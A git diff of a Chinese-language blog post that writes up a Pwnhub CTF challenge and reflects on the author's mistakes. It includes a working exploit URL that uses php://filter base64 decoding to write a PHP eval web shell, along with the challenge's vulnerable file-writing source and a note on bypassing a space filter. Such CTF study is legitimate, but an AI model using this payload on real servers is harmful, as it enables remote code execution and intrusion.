@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -100,99 +108,63 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>Pwnhub 某 CTF</h2>
-
 <p>今天參加了一個突擊題目，乍一看很簡單。</p>
-
 <p>打開題目頁面，然後就在firebug發現了</p>
-
 <pre><code>http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg
 </code></pre>
-
 <p>明顯是寫shell類型的題目。</p>
-
 <p>接下來就是考慮怎麼去讀寫。</p>
-
 <p>打開鏈接一看</p>
-
-<pre><code>console.log(&#39;logo.jpg update sucess!&#39;)
+<pre><code>console.log('logo.jpg update sucess!')
 </code></pre>
-
-<p>頓時感覺很熟悉，以前做過類似的題目，利用<code>echo &quot;console.log(&#39;&quot;.$path.&quot; update sucess!&#39;)&quot;;</code>回顯寫入payload。</p>
-
+<p>頓時感覺很熟悉，以前做過類似的題目，利用<code>echo "console.log('".$path." update sucess!')";</code>回顯寫入payload。</p>
 <p>試了下發現過濾了<strong>&lt;</strong>，不能寫入標籤也就不能寫入執行語句。</p>
-
 <p>這時候我想到的是php://fifter協議過濾寫入shell，大半個小時過去了，沒調對payload。。</p>
-
 <p>賽後小夥伴調出來了</p>
-
 <pre><code>http://54.223.231.220/image.php?path=php://filter/write=convert.base64-decode/resource=shell1.php&amp;file=http%3a%2f%2f127.0.0.1%3a8888%2fimage.php%3ffile%3dhttp%3a%2f%2f127.0.0.1%3a8888%2fimage.php%26path%3dxxPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs%2fPg
 </code></pre>
-
 <p><code>path</code>放棄了，然後轉載<code>file</code></p>
-
 <p>測試了下，只是簡單的判斷file是否有<code>http://127.0.0.1:8888/</code>，</p>
-
 <p>於是乎，就用file（php協議也行）協議讀取了源碼。</p>
-
 <pre><code>&lt;?php
-ini_set(&quot;display_errors&quot;, &quot;Off&quot;); error_reporting(E_ALL);
-$url = $_GET[&#39;file&#39;];
-$path = $_GET[&#39;path&#39;];
-if (strpos($path, &#39;..&#39;)&gt;-1)
+ini_set("display_errors", "Off"); error_reporting(E_ALL);
+$url = $_GET['file'];
+$path = $_GET['path'];
+if (strpos($path, '..')&gt;-1)
 {
-    die(&quot;error&quot;);
+    die("error");
 }
-if (strpos($path, &#39;&lt;&#39;)&gt;-1)
+if (strpos($path, '&lt;')&gt;-1)
 {
-    die(&quot;error&quot;);
+    die("error");
 }
-if (strpos($url, &#39;http://127.0.0.1:8888/&#39;)&gt;-1)
+if (strpos($url, 'http://127.0.0.1:8888/')&gt;-1)
 {
     file_put_contents($path, file_get_contents($url));
-    echo &quot;console.log(&#39;&quot;.$path.&quot; update sucess!&#39;)&quot;;
+    echo "console.log('".$path." update sucess!')";
 }
 ?&gt;
 </code></pre>
-
 <p>看了下源碼，分分鐘就可以秒破。</p>
-
 <p>明顯就是非預期做法。</p>
-
 <p>就在這個時候，官方閉站改題了。。。尷尬。</p>
-
 <p>再回到首頁看看其他線索，發現存檔頁面有個xss可以暫時保存數據。</p>
-
 <pre><code>http://54.223.231.220/?date/2016-12/
 </code></pre>
-
 <p>其中的<strong>2016﹣12</strong>會寫到頁面中，測試了下test，可以正常顯示，</p>
-
 <p>於是乎又來了一發payload。</p>
-
 <p>結構啥都沒有，以為不是這個點，有默默地區闡釋fifter/base64-decode。</p>
-
 <p>思路沒轉過來，後來看別人的wp才知道過濾了空格，簡單的二次編碼就能突破了。</p>
-
 <h2>憂傷</h2>
-
 <p>傻傻的掉進不算坑的坑，把直接坑慘了。</p>
-
 <p>最快的人17分鐘就AK了這道題，且不說是不是預期做法。</p>
-
 <p>個人做題速度太慢了，次次與flag擦肩而過。</p>
-
 <p>沒有走在點子上，或者在點子是沒深入。</p>
-
 <p>歸根結底就是對php://fifter和base64不熟悉，沒整出完美的payload。</p>
-
 <p>明明<code>test</code>可以成功，用<code>&lt;?php xxx;?&gt;</code>不成功卻沒有思考為什麼。</p>
-
 <p>以後一定要注意！！！</p>
-
 <p>明明讀取了image.php的內容卻沒有順手讀取index.php的內容。</p>
-
 <p>一隻傻逼的Virink</p>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/12/14/introspection_by_ctf.html" target="_blank">自省之CTF思維</a><br />
